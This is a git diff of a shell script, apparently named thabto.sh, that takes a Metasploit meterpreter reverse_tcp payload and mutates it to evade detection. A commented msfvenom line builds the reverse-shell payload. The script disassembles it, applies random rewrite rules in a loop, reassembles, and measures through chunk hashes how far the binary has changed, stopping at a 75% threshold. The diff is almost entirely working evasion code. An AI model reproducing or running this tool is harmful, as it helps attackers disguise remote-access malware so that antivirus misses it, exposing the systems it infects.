@@ -17,7 +17,11 @@
 #msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(hostname -I) LPORT=443 -f raw > raw_binary
 
 # Then call thabto.sh like so
-# ./thabto.sh /path/to/raw_binary /path/to/output_file
+# ./thabto.sh raw_binary output_file
+
+THRESHOLD=75
+
+
 cp $(locate disassemble.rb | grep "samples" | head -1) ./disassemble.rb
 chmod +x disassemble.rb
 
@@ -30,7 +34,7 @@ case $FILETYPE in
         ;;
     [xX]*) cp $(locate machoencode.rb | head -1) ./encode.rb
         ;;
-    *) cp $(locate peencode.rb | head -1) ./encode.rb
+    *) cp $(locate peencode.rb | head -1) ./encode.rb; cp $(locate exeencode.rb | head -1) ./exeencode.rb
         ;;
 esac
 
@@ -38,64 +42,67 @@ chmod +x encode.rb
 
 RAW_LOC="$1"
 
-# If binary is smaller than 10k, break into 20 pieces.
-FILESIZE=$(stat -c%s "$RAW_LOC")
-mkdir splits
-cd splits
-if $FILESIZE -le 10240
-then
-    split -n 20 "../$RAW_LOC"
-else
-    # Otherwise, 512-byte chunks.
-    split -b 512 "../$RAW_LOC"
-fi
-
-# Generate original hashes
-TOTAL=0
-for f in x*
-do
-    sha256sum $f >> ../OG_SUMS
-    (( TOTAL += 1 ))
-done
-
-cd ../
-rm -r splits
-
 # Disassemble
 ./disassemble.rb $RAW_LOC > asm_code.asm
 
 sed -i "1s/^/\.section \'\.text\' rwx\n\.entrypoint\n/" asm_code.asm
 
-# While change threshold not reached:
+./encode.rb asm_code.asm -o ctrl_payload
 
-# Randomly apply a rule
-
-
-# Re-assemble
-./encode asm_code.asm -o payload
-
-# Generate new hashes
+#CTRL_SUMS generated from payload recompiled after only adding section header
+# If binary is smaller than 10k, break into 20 pieces.
+FILESIZE=$(stat -c%s ctrl_payload)
 mkdir splits
 cd splits
-if $FILESIZE -le 10240
+if (( $FILESIZE < 10240 ))
 then
-    split -n 20 "../$payload"
+    split -n 20 "../ctrl_payload"
 else
     # Otherwise, 512-byte chunks.
-    split -b 512 "../$payload"
+    split -b 512 "../ctrl_payload"
 fi
+
 # Generate original hashes
 for f in x*
 do
-    sha256sum $f >> ../NEW_SUMS
+    sha256sum $f >> ../CTRL_SUMS
 done
 
 cd ../
 rm -r splits
 
-# Compare new hashes to old hashes to determine % change
-$((100 * CHANGED/TOTAL))
-#/while
-: << CLEAN_UP
-rm encode.rb disassemble.rb asm_code.asm $RAW_LOC
-CLEAN_UP
+TOTAL=$(wc -l CTRL_SUMS | awk '{print $1}' )
+
+# While change threshold not reached:
+find rules/ -type f -name *'.r' | shuf -r | while read rule
+do
+
+    # Randomly apply a rule
+    eval "$rule"
+
+    # Re-assemble
+    ./encode.rb asm_code.asm -o payload
+
+    # Generate new hashes
+    mkdir splits
+    cd splits
+    if (( $FILESIZE < 10240 ))
+    then
+        split -n 20 "../payload"
+    else
+        # Otherwise, 512-byte chunks.
+        split -b 512 "../payload"
+    fi
+
+    CHANGED=$(sha256sum -c ../CTRL_SUMS 2>/dev/null | grep -c "FAILED")
+
+    cd ../
+    rm -r splits
+
+    # Compare new hashes to old hashes to determine % change
+    [[ $((100 * CHANGED/TOTAL)) -ge $THRESHOLD ]] && { break; }
+done
+
+mv payload $2
+
+#rm -f encode.rb disassemble.rb asm_code.asm $RAW_LOC exeencode.rb
